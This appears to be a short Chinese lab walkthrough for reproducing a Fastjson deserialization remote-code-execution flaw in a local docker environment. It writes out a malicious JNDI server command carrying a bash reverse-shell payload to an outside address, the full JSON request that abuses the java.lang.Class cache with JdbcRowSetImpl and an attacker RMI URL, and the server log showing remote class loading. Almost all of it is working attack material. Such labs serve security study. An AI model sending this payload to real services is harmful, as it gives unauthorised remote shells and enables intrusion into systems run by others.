开启环境：
```
docker compose up -d
```
访问页面：
```
http://localhost:8090
```

恶意JNDI服务（替代marshalsec）
```
/usr/bin/java -jar ~/Desktop/tools/jndi.jar \
  -C 'bash -i >& /dev/tcp/0.250.250.254/4444 0>&1' \
  -A 0.250.250.254
```
发送数据包：
```
POST / HTTP/1.1

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://0.250.250.254:1099/hb0z3q",
        "autoCommit":true
    }
}
```
发送后JNDI服务会显示：
`2026-09-22 13:42:32 [RMISERVER] >> Have connection from /127.0.0.1:52854 2026-09-22 13:42:32 [RMISERVER] >> Reading message... 2026-09-22 13:42:32 [RMISERVER] >> Is RMI.lookup call for hb0z3q 2 2026-09-22 13:42:32 [RMISERVER] >> Sending remote classloading stub targeting http://0.250.250.254:8180/ExecTemplateJDK7.class 2026-09-22 13:42:32 [RMISERVER] >> Closing connection 2026-09-22 13:42:32 [JETTYSERVER]>> Log a request to http://0.250.250.254:8180/ExecTemplateJDK7.class`

```
docker compose exec web bash
```
